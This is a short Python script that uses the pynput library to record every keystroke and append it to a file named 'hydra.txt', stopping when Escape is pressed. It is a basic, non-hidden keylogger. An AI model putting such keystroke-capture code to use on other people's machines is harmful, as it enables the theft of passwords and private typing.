from pynput import keyboard


def writete(txt):
    filelog = open('hydra.txt','a',encoding='utf-8')
    filelog.write(txt)
    filelog.close()


    



def on_press(key):
    try:
        text = str(key)
        text=text.replace("'","")
        if text[:3] == 'Key':
             text = str("|")+format(text[4:])+str("|")
        writete(text)
    except AttributeError:
        print('special key {0} pressed'.format(key))
        
           

def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False
  
# Collect events until released
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
